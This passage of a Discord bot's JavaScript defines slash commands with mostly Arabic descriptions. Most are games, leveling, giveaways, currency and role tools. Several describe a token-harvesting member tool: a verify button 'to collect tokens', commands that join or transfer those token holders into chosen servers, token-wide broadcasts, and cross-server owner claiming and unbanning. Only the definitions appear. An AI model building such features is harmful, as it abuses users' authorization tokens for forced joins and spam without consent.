      { name: "\u0646\u0638\u0627\u0645 \u0627\u0644\u0644\u0641\u0644", value: "leveling" },
      { name: "\u0646\u0638\u0627\u0645 \u0627\u0644\u062A\u0631\u062D\u064A\u0628", value: "welcome" },
      { name: "\u0627\u0644\u062D\u0645\u0627\u064A\u0629", value: "protection" }
    )),
    new SlashCommandBuilder().setName("toggle").setDescription("\u062A\u0641\u0639\u064A\u0644 \u0623\u0648 \u062A\u0639\u0637\u064A\u0644 \u0645\u064A\u0632\u0627\u062A \u0627\u0644\u0628\u0648\u062A (Admin Only)").addStringOption((option) => option.setName("feature").setDescription("\u0627\u0644\u0645\u064A\u0632\u0629 \u0627\u0644\u0645\u0631\u0627\u062F \u062A\u063A\u064A\u064A\u0631 \u062D\u0627\u0644\u062A\u0647\u0627").setRequired(true).addChoices(
      { name: "\u0646\u0638\u0627\u0645 \u0627\u0644\u0644\u0641\u0644", value: "leveling" },
      { name: "\u0646\u0638\u0627\u0645 \u0627\u0644\u062A\u0631\u062D\u064A\u0628", value: "welcome" },
      { name: "\u0627\u0644\u062D\u0645\u0627\u064A\u0629", value: "protection" }
    )).addStringOption((option) => option.setName("status").setDescription("\u0627\u0644\u062D\u0627\u0644\u0629").setRequired(true).addChoices(
      { name: "\u062A\u0641\u0639\u064A\u0644", value: "on" },
      { name: "\u062A\u0639\u0637\u064A\u0644", value: "off" }
    )),
    new SlashCommandBuilder().setName("set-alias").setDescription("Create a shortcut for another command (Admin Only)").addStringOption((option) => option.setName("alias").setDescription("The new shortcut name (e.g., r)").setRequired(true)).addStringOption((option) => option.setName("command").setDescription("The original command name (e.g., rank)").setRequired(true)),
    new SlashCommandBuilder().setName("remove-alias").setDescription("Remove a command shortcut (Admin Only)").addStringOption((option) => option.setName("alias").setDescription("The shortcut name to remove").setRequired(true)),
    new SlashCommandBuilder().setName("set-avatar").setDescription("Set the bot's avatar (Admin Only)").addStringOption((option) => option.setName("url").setDescription("The image URL for the avatar").setRequired(true)),
    new SlashCommandBuilder().setName("promote-owner").setDescription("Promote a user to Owner status (Guild Owner Only)").addUserOption((option) => option.setName("user").setDescription("The user to promote").setRequired(true)),
    new SlashCommandBuilder().setName("accept").setDescription("Accept a user and give them the Owner role (Admin Only)").addUserOption((option) => option.setName("user").setDescription("The user to accept").setRequired(true)),
    new SlashCommandBuilder().setName("transfer").setDescription("\u0646\u0642\u0644 \u0627\u0644\u0623\u0639\u0636\u0627\u0621 \u0645\u0646 \u0633\u064A\u0631\u0641\u0631 \u0622\u062E\u0631").addStringOption((option) => option.setName("from_server_id").setDescription("ID \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0631\u0627\u062F \u0627\u0644\u0646\u0642\u0644 \u0645\u0646\u0647").setRequired(true)).addStringOption((option) => option.setName("to_server_id").setDescription("ID \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0631\u0627\u062F \u0627\u0644\u0646\u0642\u0644 \u0625\u0644\u064A\u0647 (\u0627\u062A\u0631\u0643\u0647 \u0641\u0627\u0631\u063A\u0627\u064B \u0644\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u062D\u0627\u0644\u064A)").setRequired(false)),
    new SlashCommandBuilder().setName("setup-verify").setDescription("\u0625\u0639\u062F\u0627\u062F \u0632\u0631 \u0627\u0644\u062A\u062D\u0642\u0642 \u0644\u062C\u0645\u0639 \u0627\u0644\u062A\u0648\u0643\u0646\u0627\u062A").addRoleOption((option) => option.setName("role").setDescription("\u0627\u0644\u0631\u062A\u0628\u0629 \u0627\u0644\u062A\u064A \u0633\u064A\u062D\u0635\u0644 \u0639\u0644\u064A\u0647\u0627 \u0627\u0644\u0639\u0636\u0648 \u0628\u0639\u062F \u0627\u0644\u062A\u062D\u0642\u0642").setRequired(true)),
    new SlashCommandBuilder().setName("broadcast").setDescription("\u0625\u0631\u0633\u0627\u0644 \u0631\u0633\u0627\u0644\u0629 \u0628\u0631\u0648\u062F\u0643\u0627\u0633\u062A \u0644\u062C\u0645\u064A\u0639 \u0623\u0639\u0636\u0627\u0621 \u0633\u064A\u0631\u0641\u0631 \u0645\u0639\u064A\u0646").addStringOption((opt) => opt.setName("server_id").setDescription("ID \u0627\u0644\u0633\u064A\u0631\u0641\u0631").setRequired(true)).addStringOption((opt) => opt.setName("message").setDescription("\u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u0645\u0631\u0627\u062F \u0625\u0631\u0633\u0627\u0644\u0647\u0627").setRequired(true)),
    new SlashCommandBuilder().setName("broadcast-here").setDescription("\u0625\u0631\u0633\u0627\u0644 \u0631\u0633\u0627\u0644\u0629 \u0628\u0631\u0648\u062F\u0643\u0627\u0633\u062A \u0644\u062C\u0645\u064A\u0639 \u0623\u0639\u0636\u0627\u0621 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u062D\u0627\u0644\u064A").addStringOption((opt) => opt.setName("message").setDescription("\u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u0645\u0631\u0627\u062F \u0625\u0631\u0633\u0627\u0644\u0647\u0627").setRequired(true)),
    new SlashCommandBuilder().setName("broadcast-tokens").setDescription("\u0625\u0631\u0633\u0627\u0644 \u0631\u0633\u0627\u0644\u0629 \u0628\u0631\u0648\u062F\u0643\u0627\u0633\u062A \u0644\u062C\u0645\u064A\u0639 \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645\u064A\u0646 \u0627\u0644\u0645\u0633\u062C\u0644\u064A\u0646 (\u0627\u0644\u062A\u0648\u0643\u0646\u0627\u062A)").addStringOption((opt) => opt.setName("message").setDescription("\u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u0645\u0631\u0627\u062F \u0625\u0631\u0633\u0627\u0644\u0647\u0627").setRequired(true)),
    new SlashCommandBuilder().setName("guilds").setDescription("\u0639\u0631\u0636 \u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0633\u064A\u0631\u0641\u0631\u0627\u062A \u0627\u0644\u062A\u064A \u064A\u062A\u0648\u0627\u062C\u062F \u0641\u064A\u0647\u0627 \u0627\u0644\u0628\u0648\u062A"),
    new SlashCommandBuilder().setName("get-invite").setDescription("\u0625\u0646\u0634\u0627\u0621 \u0631\u0627\u0628\u0637 \u062F\u0639\u0648\u0629 \u0644\u0633\u064A\u0631\u0641\u0631 \u0645\u0639\u064A\u0646 \u064A\u062A\u0648\u0627\u062C\u062F \u0641\u064A\u0647 \u0627\u0644\u0628\u0648\u062A").addStringOption((opt) => opt.setName("server_id").setDescription("ID \u0627\u0644\u0633\u064A\u0631\u0641\u0631").setRequired(true)),
    new SlashCommandBuilder().setName("claim-owner").setDescription("Claim the Owner role (Authorized Users Only)"),
    new SlashCommandBuilder().setName("join-server").setDescription("\u0625\u062F\u062E\u0627\u0644 \u0627\u0644\u0623\u0639\u0636\u0627\u0621 (\u0627\u0644\u062A\u0648\u0643\u0646\u0627\u062A) \u0625\u0644\u0649 \u0633\u064A\u0631\u0641\u0631 \u0645\u0639\u064A\u0646 \u0628\u0648\u0627\u0633\u0637\u0629 ID").addStringOption((option) => option.setName("server_id").setDescription("ID \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641").setRequired(true)),
    new SlashCommandBuilder().setName("force-accept").setDescription("Accept a user in a specific server (Authorized Users Only)").addUserOption((option) => option.setName("user").setDescription("The user to accept").setRequired(true)).addStringOption((option) => option.setName("server_id").setDescription("The target server ID").setRequired(true)),
    new SlashCommandBuilder().setName("rps").setDescription("\u0644\u0639\u0628\u0629 \u062D\u062C\u0631 \u0648\u0631\u0642\u0629 \u0645\u0642\u0635").addStringOption((option) => option.setName("choice").setDescription("\u0627\u062E\u062A\u0631 \u062D\u062C\u0631 \u0623\u0648 \u0648\u0631\u0642\u0629 \u0623\u0648 \u0645\u0642\u0635").setRequired(true).addChoices(
      { name: "\u062D\u062C\u0631", value: "rock" },
      { name: "\u0648\u0631\u0642\u0629", value: "paper" },
      { name: "\u0645\u0642\u0635", value: "scissors" }
    )),
    new SlashCommandBuilder().setName("coinflip").setDescription("\u0644\u0639\u0628\u0629 \u0631\u0645\u064A \u0627\u0644\u0639\u0645\u0644\u0629 (\u0645\u0644\u0643 \u0623\u0648 \u0643\u062A\u0627\u0628\u0629)"),
    new SlashCommandBuilder().setName("guess").setDescription("\u0644\u0639\u0628\u0629 \u062A\u062E\u0645\u064A\u0646 \u0627\u0644\u0631\u0642\u0645 (\u0645\u0646 1 \u0625\u0644\u0649 10)").addIntegerOption((option) => option.setName("number").setDescription("\u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0630\u064A \u062A\u062E\u0645\u0646\u0647").setRequired(true)),
    new SlashCommandBuilder().setName("mafia").setDescription("\u0628\u062F\u0621 \u0644\u0639\u0628\u0629 \u0645\u0627\u0641\u064A\u0627"),
    new SlashCommandBuilder().setName("trivia").setDescription("\u0644\u0639\u0628\u0629 \u0623\u0633\u0626\u0644\u0629 \u0648\u0623\u062C\u0648\u0628\u0629"),
    new SlashCommandBuilder().setName("hangman").setDescription("\u0644\u0639\u0628\u0629 \u0627\u0644\u0645\u0634\u0646\u0642\u0629 (\u062A\u062E\u0645\u064A\u0646 \u0627\u0644\u0643\u0644\u0645\u0627\u062A)"),
    new SlashCommandBuilder().setName("fastclick").setDescription("\u0644\u0639\u0628\u0629 \u0623\u0633\u0631\u0639 \u0636\u063A\u0637\u0629"),
    new SlashCommandBuilder().setName("snake").setDescription("\u0644\u0639\u0628\u0629 \u0627\u0644\u062B\u0639\u0628\u0627\u0646"),
    new SlashCommandBuilder().setName("setup-apply").setDescription("\u0625\u0639\u062F\u0627\u062F \u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u0642\u062F\u064A\u0645 (\u0625\u062F\u0627\u0631\u0629/\u0631\u062A\u0628\u0629)"),
    new SlashCommandBuilder().setName("apply-settings").setDescription("\u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0627\u0644\u062A\u0642\u062F\u064A\u0645 (Admin Only)").addChannelOption((option) => option.setName("channel").setDescription("\u0627\u0644\u0642\u0646\u0627\u0629 \u0627\u0644\u062A\u064A \u0633\u062A\u0635\u0644 \u0625\u0644\u064A\u0647\u0627 \u0627\u0644\u062A\u0642\u062F\u064A\u0645\u0627\u062A").setRequired(true)).addRoleOption((option) => option.setName("role").setDescription("\u0627\u0644\u0631\u062A\u0628\u0629 \u0627\u0644\u062A\u064A \u0633\u064A\u062D\u0635\u0644 \u0639\u0644\u064A\u0647\u0627 \u0627\u0644\u0645\u0642\u0628\u0648\u0644").setRequired(true)).addRoleOption((option) => option.setName("staff_role").setDescription("\u0631\u062A\u0628\u0629 \u0627\u0644\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u062A\u064A \u064A\u0645\u0643\u0646\u0647\u0627 \u0645\u0631\u0627\u062C\u0639\u0629 \u0627\u0644\u062A\u0642\u062F\u064A\u0645\u0627\u062A").setRequired(true)).addStringOption((option) => option.setName("image").setDescription("\u0631\u0627\u0628\u0637 \u0635\u0648\u0631\u0629 \u0627\u0644\u062A\u0642\u062F\u064A\u0645 (\u0627\u062E\u062A\u064A\u0627\u0631\u064A)").setRequired(false)).addStringOption((option) => option.setName("questions").setDescription("\u0627\u0644\u0623\u0633\u0626\u0644\u0629 \u0645\u0641\u0635\u0648\u0644\u0629 \u0628\u0641\u0627\u0635\u0644\u0629 (\u0628\u062D\u062F \u0623\u0642\u0635\u0649 5 \u0623\u0633\u0626\u0644\u0629)").setRequired(false)),
    new SlashCommandBuilder().setName("suggest-settings").setDescription("\u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0627\u0644\u0627\u0642\u062A\u0631\u0627\u062D\u0627\u062A (Admin Only)").addChannelOption((option) => option.setName("channel").setDescription("\u0627\u0644\u0642\u0646\u0627\u0629 \u0627\u0644\u062A\u064A \u0633\u062A\u0638\u0647\u0631 \u0641\u064A\u0647\u0627 \u0627\u0644\u0627\u0642\u062A\u0631\u0627\u062D\u0627\u062A").setRequired(true)),
    new SlashCommandBuilder().setName("suggest").setDescription("\u0625\u0631\u0633\u0627\u0644 \u0627\u0642\u062A\u0631\u0627\u062D \u062C\u062F\u064A\u062F").addStringOption((option) => option.setName("suggestion").setDescription("\u0627\u0643\u062A\u0628 \u0627\u0642\u062A\u0631\u0627\u062D\u0643 \u0647\u0646\u0627").setRequired(true)),
    new SlashCommandBuilder().setName("eval-settings").setDescription("\u0625\u0639\u062F\u0627\u062F\u0627\u062A \u062A\u0642\u064A\u064A\u0645 \u0627\u0644\u0625\u062F\u0627\u0631\u0629 (Admin Only)").addChannelOption((option) => option.setName("channel").setDescription("\u0627\u0644\u0642\u0646\u0627\u0629 \u0627\u0644\u062A\u064A \u0633\u062A\u0635\u0644 \u0625\u0644\u064A\u0647\u0627 \u0627\u0644\u062A\u0642\u064A\u064A\u0645\u0627\u062A").setRequired(true)),
    new SlashCommandBuilder().setName("rate-staff").setDescription("\u062A\u0642\u064A\u064A\u0645 \u0623\u062D\u062F \u0623\u0639\u0636\u0627\u0621 \u0627\u0644\u0625\u062F\u0627\u0631\u0629").addUserOption((option) => option.setName("staff").setDescription("\u0627\u0644\u0639\u0636\u0648 \u0627\u0644\u0645\u0631\u0627\u062F \u062A\u0642\u064A\u064A\u0645\u0647").setRequired(true)).addIntegerOption((option) => option.setName("rating").setDescription("\u0627\u0644\u062A\u0642\u064A\u064A\u0645 \u0645\u0646 1 \u0625\u0644\u0649 5 \u0646\u062C\u0648\u0645").setRequired(true).setMinValue(1).setMaxValue(5)).addStringOption((option) => option.setName("feedback").setDescription("\u0645\u0644\u0627\u062D\u0638\u0627\u062A\u0643 \u0627\u0644\u0625\u0636\u0627\u0641\u064A\u0629").setRequired(false)),
    new SlashCommandBuilder().setName("replica").setDescription("\u0644\u0639\u0628\u0629 \u0631\u064A\u0628\u064A\u0643\u0627 (\u062D\u064A\u0648\u0627\u0646\u060C \u062C\u0645\u0627\u062F\u060C \u0625\u0644\u062E)"),
    new SlashCommandBuilder().setName("azkar-setup").setDescription("\u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0646\u0638\u0627\u0645 \u0627\u0644\u0623\u0630\u0643\u0627\u0631 (Admin Only)").addChannelOption((option) => option.setName("channel").setDescription("\u0627\u0644\u0642\u0646\u0627\u0629 \u0627\u0644\u062A\u064A \u0633\u062A\u0638\u0647\u0631 \u0641\u064A\u0647\u0627 \u0627\u0644\u0623\u0630\u0643\u0627\u0631").setRequired(true)).addIntegerOption((option) => option.setName("interval").setDescription("\u0627\u0644\u0645\u062F\u0629 \u0627\u0644\u0632\u0645\u0646\u064A\u0629 \u0628\u064A\u0646 \u0643\u0644 \u0630\u0643\u0631 (\u0628\u0627\u0644\u062F\u0642\u0627\u0626\u0642)").setRequired(true).setMinValue(1).setMaxValue(1440)).addStringOption((option) => option.setName("status").setDescription("\u062A\u0641\u0639\u064A\u0644 \u0623\u0648 \u062A\u0639\u0637\u064A\u0644 \u0627\u0644\u0646\u0638\u0627\u0645").setRequired(true).addChoices(
      { name: "\u062A\u0641\u0639\u064A\u0644", value: "on" },
      { name: "\u062A\u0639\u0637\u064A\u0644", value: "off" }
    )),
    new SlashCommandBuilder().setName("azkar-add").setDescription("\u0625\u0636\u0627\u0641\u0629 \u0630\u0643\u0631 \u0645\u062E\u0635\u0635 (Admin Only)").addStringOption((option) => option.setName("content").setDescription("\u0627\u0644\u0630\u0643\u0631 \u0627\u0644\u0645\u0631\u0627\u062F \u0625\u0636\u0627\u0641\u062A\u0647").setRequired(true)),
    new SlashCommandBuilder().setName("azkar-list").setDescription("\u0639\u0631\u0636 \u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0630\u0643\u0627\u0631 \u0627\u0644\u0645\u062E\u0635\u0635\u0629 (Admin Only)"),
    new SlashCommandBuilder().setName("azkar-remove").setDescription("\u062D\u0630\u0641 \u0630\u0643\u0631 \u0645\u062E\u0635\u0635 (Admin Only)").addIntegerOption((option) => option.setName("id").setDescription("\u0631\u0642\u0645 \u0627\u0644\u0630\u0643\u0631 \u0627\u0644\u0645\u0631\u0627\u062F \u062D\u0630\u0641\u0647").setRequired(true)),
    new SlashCommandBuilder().setName("set-currency-log").setDescription("\u0625\u0639\u062F\u0627\u062F \u0642\u0646\u0627\u0629 \u0633\u062C\u0644 \u0627\u0644\u0639\u0645\u0644\u0627\u062A (Admin Only)").addChannelOption((option) => option.setName("channel").setDescription("\u0627\u0644\u0642\u0646\u0627\u0629 \u0627\u0644\u062A\u064A \u0633\u064A\u062A\u0645 \u062A\u0633\u062C\u064A\u0644 \u0627\u0644\u0639\u0645\u0644\u064A\u0627\u062A \u0641\u064A\u0647\u0627").setRequired(true)),
    new SlashCommandBuilder().setName("confirm-transfer").setDescription("\u062A\u0623\u0643\u064A\u062F \u0639\u0645\u0644\u064A\u0629 \u062A\u062D\u0648\u064A\u0644 \u0627\u0644\u0639\u0645\u0644\u0627\u062A").addStringOption((option) => option.setName("code").setDescription("\u0643\u0648\u062F \u0627\u0644\u062A\u0623\u0643\u064A\u062F \u0627\u0644\u0645\u0643\u0648\u0646 \u0645\u0646 6 \u0623\u0631\u0642\u0627\u0645").setRequired(true)),
    new SlashCommandBuilder().setName("mention-protection").setDescription("\u062A\u0641\u0639\u064A\u0644 \u0623\u0648 \u062A\u0639\u0637\u064A\u0644 \u062D\u0645\u0627\u064A\u0629 \u0627\u0644\u0645\u0646\u0634\u0646").addStringOption((option) => option.setName("status").setDescription("on \u0623\u0648 off").setRequired(true)),
    new SlashCommandBuilder().setName("add-bonus").setDescription("\u0625\u0636\u0627\u0641\u0629 \u0628\u0648\u0646\u064A\u0633 \u0644\u0639\u0636\u0648 (Authorized Role Only)").addUserOption((option) => option.setName("user").setDescription("\u0627\u0644\u0639\u0636\u0648").setRequired(true)).addIntegerOption((option) => option.setName("amount").setDescription("\u0627\u0644\u0643\u0645\u064A\u0629").setRequired(true)),
    new SlashCommandBuilder().setName("remove-bonus").setDescription("\u0633\u062D\u0628 \u0628\u0648\u0646\u064A\u0633 \u0645\u0646 \u0639\u0636\u0648 (Authorized Role Only)").addUserOption((option) => option.setName("user").setDescription("\u0627\u0644\u0639\u0636\u0648").setRequired(true)).addIntegerOption((option) => option.setName("amount").setDescription("\u0627\u0644\u0643\u0645\u064A\u0629").setRequired(true)),
    new SlashCommandBuilder().setName("set-bonus").setDescription("\u062A\u062D\u062F\u064A\u062F \u0628\u0648\u0646\u064A\u0633 \u0644\u0639\u0636\u0648 (Authorized Role Only)").addUserOption((option) => option.setName("user").setDescription("\u0627\u0644\u0639\u0636\u0648").setRequired(true)).addIntegerOption((option) => option.setName("amount").setDescription("\u0627\u0644\u0643\u0645\u064A\u0629").setRequired(true)),
    new SlashCommandBuilder().setName("bonus-role-add").setDescription("\u0625\u0636\u0627\u0641\u0629 \u0631\u062A\u0628\u0629 \u062A\u0631\u0642\u064A\u0629 \u062A\u0644\u0642\u0627\u0626\u064A\u0629 \u0628\u0648\u0627\u0633\u0637\u0629 Bonus (Admin Only)").addRoleOption((option) => option.setName("role").setDescription("\u0627\u0644\u0631\u062A\u0628\u0629").setRequired(true)),
    new SlashCommandBuilder().setName("bonus-role-remove").setDescription("\u0625\u0632\u0627\u0644\u0629 \u0631\u062A\u0628\u0629 \u062A\u0631\u0642\u064A\u0629 \u062A\u0644\u0642\u0627\u0626\u064A\u0629 (Admin Only)").addRoleOption((option) => option.setName("role").setDescription("\u0627\u0644\u0631\u062A\u0628\u0629").setRequired(true)),
    new SlashCommandBuilder().setName("bonus-role-list").setDescription("\u0639\u0631\u0636 \u0642\u0627\u0626\u0645\u0629 \u0631\u062A\u0628 \u0627\u0644\u062A\u0631\u0642\u064A\u0629 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A\u0629"),
    new SlashCommandBuilder().setName("bonus-role-settings").setDescription("\u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0627\u0644\u062A\u0631\u0642\u064A\u0629 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A\u0629 (Admin Only)").addRoleOption((option) => option.setName("max-role").setDescription("\u0623\u0639\u0644\u0649 \u0631\u062A\u0628\u0629 \u064A\u0645\u0643\u0646 \u0627\u0644\u0648\u0635\u0648\u0644 \u0625\u0644\u064A\u0647\u0627")).addRoleOption((option) => option.setName("base-role").setDescription("\u0627\u0644\u0631\u062A\u0628\u0629 \u0627\u0644\u0623\u0633\u0627\u0633\u064A\u0629 \u0627\u0644\u0645\u0637\u0644\u0648\u0628\u0629 \u0644\u0628\u062F\u0621 \u0627\u0644\u062A\u0631\u0642\u064A\u0629")).addStringOption((option) => option.setName("excluded-roles").setDescription("\u0631\u062A\u0628 \u0645\u0633\u062A\u0628\u0639\u062F\u0629 (ID \u0627\u0644\u0631\u062A\u0628 \u0645\u0641\u0635\u0648\u0644\u0629 \u0628\u0641\u0627\u0635\u0644\u0629)")),
    new SlashCommandBuilder().setName("giveaway").setDescription("\u0625\u0646\u0634\u0627\u0621 \u0645\u0633\u0627\u0628\u0642\u0629 (Giveaway)").addStringOption((option) => option.setName("prize").setDescription("\u0627\u0644\u062C\u0627\u0626\u0632\u0629").setRequired(true)).addIntegerOption((option) => option.setName("duration").setDescription("\u0627\u0644\u0645\u062F\u0629 \u0628\u0627\u0644\u062F\u0642\u0627\u0626\u0642").setRequired(true)).addIntegerOption((option) => option.setName("winners").setDescription("\u0639\u062F\u062F \u0627\u0644\u0641\u0627\u0626\u0632\u064A\u0646").setRequired(true)),
    new SlashCommandBuilder().setName("roulette").setDescription("\u0633\u062D\u0628 \u0631\u0648\u0644\u064A\u062A \u062A\u0641\u0627\u0639\u0644\u064A \u0645\u0639 \u0623\u0646\u064A\u0645\u064A\u0634\u0646").addStringOption((option) => option.setName("options").setDescription("\u0627\u0644\u062E\u064A\u0627\u0631\u0627\u062A \u0645\u0641\u0635\u0648\u0644\u0629 \u0628\u0641\u0627\u0635\u0644\u0629 (\u0627\u062E\u062A\u064A\u0627\u0631\u064A\u060C \u0625\u0630\u0627 \u0644\u0645 \u064A\u0648\u0636\u0639 \u0633\u064A\u062A\u0645 \u0641\u062A\u062D \u0627\u0646\u0636\u0645\u0627\u0645)").setRequired(false)),
    new SlashCommandBuilder().setName("copy-server").setDescription("\u0646\u0633\u062E \u0647\u064A\u0643\u0644 \u0633\u064A\u0631\u0641\u0631 \u0622\u062E\u0631 (\u0631\u062A\u0628 \u0648\u0642\u0646\u0648\u0627\u062A)").addStringOption((option) => option.setName("source_id").setDescription("ID \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0631\u0627\u062F \u0627\u0644\u0646\u0633\u062E \u0645\u0646\u0647").setRequired(true)),
    new SlashCommandBuilder().setName("unban").setDescription("Unban a user from a specific server (Authorized Only)").addStringOption((option) => option.setName("server_id").setDescription("ID of the server").setRequired(true)).addStringOption((option) => option.setName("user_id").setDescription("ID of the user to unban").setRequired(true)),
    new SlashCommandBuilder().setName("botinfo").setDescription("Display detailed information about the bot"),
    new SlashCommandBuilder().setName("add-role").setDescription("Assign a role to a user").addUserOption((option) => option.setName("user").setDescription("The user to give the role to").setRequired(true)).addRoleOption((option) => option.setName("role").setDescription("The role to assign").setRequired(true)),
    new SlashCommandBuilder().setName("remove-role").setDescription("Remove a role from a user").addUserOption((option) => option.setName("user").setDescription("The user to remove the role from").setRequired(true)).addRoleOption((option) => option.setName("role").setDescription("The role to remove").setRequired(true)),
    new SlashCommandBuilder().setName("list-roles").setDescription("List all roles of a user").addUserOption((option) => option.setName("user").setDescription("The user to list roles for").setRequired(true)),
    new SlashCommandBuilder().setName("list").setDescription("\u0639\u0631\u0636 \u0627\u0644\u0642\u0648\u0627\u0626\u0645 \u0627\u0644\u0645\u062E\u0635\u0635\u0629").addStringOption((option) => option.setName("name").setDescription("\u0627\u0633\u0645 \u0627\u0644\u0642\u0627\u0626\u0645\u0629").setRequired(false)),
    new SlashCommandBuilder().setName("p").setDescription("\u0639\u0631\u0636 \u0628\u0631\u0648\u0641\u0627\u064A\u0644\u0643 \u0648\u0639\u0645\u0644\u0627\u062A XB \u0627\u0644\u062E\u0627\u0635\u0629 \u0628\u0643").addUserOption((option) => option.setName("user").setDescription("\u0627\u0644\u0639\u0636\u0648 \u0627\u0644\u0645\u0631\u0627\u062F \u0639\u0631\u0636 \u0628\u0631\u0648\u0641\u0627\u064A\u0644\u0647 (\u0627\u062E\u062A\u064A\u0627\u0631\u064A)")),
    new SlashCommandBuilder().setName("c").setDescription("\u0639\u0631\u0636 \u0631\u0635\u064A\u062F\u0643 \u0623\u0648 \u062A\u062D\u0648\u064A\u0644 \u0639\u0645\u0644\u0627\u062A XB").addUserOption((option) => option.setName("user").setDescription("\u0627\u0644\u0639\u0636\u0648 \u0627\u0644\u0645\u0631\u0627\u062F \u0627\u0644\u062A\u062D\u0648\u064A\u0644 \u0644\u0647 \u0623\u0648 \u0639\u0631\u0636 \u0631\u0635\u064A\u062F\u0647")).addIntegerOption((option) => option.setName("amount").setDescription("\u0627\u0644\u0645\u0628\u0644\u063A \u0627\u0644\u0645\u0631\u0627\u062F \u062A\u062D\u0648\u064A\u0644\u0647")),
    new SlashCommandBuilder().setName("add-xb").setDescription("\u0625\u0636\u0627\u0641\u0629 \u0639\u0645\u0644\u0627\u062A XB \u0644\u0639\u0636\u0648 (Authorized Only)").addUserOption((option) => option.setName("user").setDescription("\u0627\u0644\u0639\u0636\u0648").setRequired(true)).addIntegerOption((option) => option.setName("amount").setDescription("\u0627\u0644\u0645\u0628\u0644\u063A").setRequired(true)),
    new SlashCommandBuilder().setName("inadd-xb").setDescription("\u0633\u062D\u0628 \u0639\u0645\u0644\u0627\u062A XB \u0645\u0646 \u0639\u0636\u0648 (Authorized Only)").addUserOption((option) => option.setName("user").setDescription("\u0627\u0644\u0639\u0636\u0648").setRequired(true)).addIntegerOption((option) => option.setName("amount").setDescription("\u0627\u0644\u0645\u0628\u0644\u063A").setRequired(true)),
    new SlashCommandBuilder().setName("reset-xb").setDescription("\u062A\u0635\u0641\u064A\u0631 \u0639\u0645\u0644\u0627\u062A XB \u0644\u0639\u0636\u0648 \u0623\u0648 \u0644\u0644\u0643\u0644 (Authorized Only)").addUserOption((option) => option.setName("user").setDescription("\u0627\u0644\u0639\u0636\u0648 \u0627\u0644\u0645\u0631\u0627\u062F \u062A\u0635\u0641\u064A\u0631\u0647")).addBooleanOption((option) => option.setName("all").setDescription("\u062A\u0635\u0641\u064A\u0631 \u0631\u0635\u064A\u062F \u0627\u0644\u062C\u0645\u064A\u0639\u061F")),
    new SlashCommandBuilder().setName("command-room").setDescription("\u0627\u0644\u062A\u062D\u0643\u0645 \u0641\u064A \u063A\u0631\u0641 \u0627\u0644\u0623\u0648\u0627\u0645\u0631 (Admin Only)").addStringOption((option) => option.setName("command").setDescription("\u0627\u0633\u0645 \u0627\u0644\u0623\u0645\u0631").setRequired(true)).addChannelOption((option) => option.setName("channel").setDescription("\u0627\u0644\u0642\u0646\u0627\u0629").setRequired(true)).addStringOption((option) => option.setName("type").setDescription("\u0627\u0644\u0646\u0648\u0639 (\u0633\u0645\u0627\u062D \u0623\u0648 \u0645\u0646\u0639)").setRequired(true).addChoices(
      { name: "\u0633\u0645\u0627\u062D (Whitelist)", value: "allow" },
      { name: "\u0645\u0646\u0639 (Blacklist)", value: "deny" },
      { name: "\u0625\u0632\u0627\u0644\u0629 \u0627\u0644\u0642\u064A\u062F (Remove)", value: "remove" }
    )),
    new SlashCommandBuilder().setName("u").setDescription("\u0639\u0631\u0636 \u0645\u0633\u062A\u0648\u0649 \u062A\u0641\u0627\u0639\u0644 \u0627\u0644\u0639\u0636\u0648").addUserOption((option) => option.setName("user").setDescription("\u0627\u0644\u0639\u0636\u0648 \u0627\u0644\u0645\u0631\u0627\u062F \u0639\u0631\u0636 \u062A\u0641\u0627\u0639\u0644\u0647")),
    new SlashCommandBuilder().setName("y").setDescription("\u0639\u0631\u0636 \u062A\u0627\u0631\u064A\u062E \u0627\u0646\u0636\u0645\u0627\u0645 \u0627\u0644\u0639\u0636\u0648 \u0644\u0644\u0633\u064A\u0631\u0641\u0631").addUserOption((option) => option.setName("user").setDescription("\u0627\u0644\u0639\u0636\u0648 \u0627\u0644\u0645\u0631\u0627\u062F \u0639\u0631\u0636 \u062A\u0627\u0631\u064A\u062E \u0627\u0646\u0636\u0645\u0627\u0645\u0647")),
    new SlashCommandBuilder().setName("ai").setDescription("\u0627\u0644\u062A\u062D\u062F\u062B \u0645\u0639 \u0627\u0644\u0630\u0643\u0627\u0621 \u0627\u0644\u0627\u0635\u0637\u0646\u0627\u0639\u064A").addStringOption((option) => option.setName("prompt").setDescription("\u0633\u0624\u0627\u0644\u0643 \u0644\u0644\u0630\u0643\u0627\u0621 \u0627\u0644\u0627\u0635\u0637\u0646\u0627\u0639\u064A").setRequired(true)),
    new SlashCommandBuilder().setName("auto-role-add").setDescription("\u0625\u0636\u0627\u0641\u0629 \u0631\u062A\u0628\u0629 \u062A\u0644\u0642\u0627\u0626\u064A\u0629 \u0648\u0625\u0639\u0637\u0627\u0624\u0647\u0627 \u0644\u062C\u0645\u064A\u0639 \u0627\u0644\u0623\u0639\u0636\u0627\u0621 (Admin Only)").addRoleOption((option) => option.setName("role").setDescription("\u0627\u0644\u0631\u062A\u0628\u0629 \u0627\u0644\u0645\u0631\u0627\u062F \u0625\u0636\u0627\u0641\u062A\u0647\u0627").setRequired(true)),
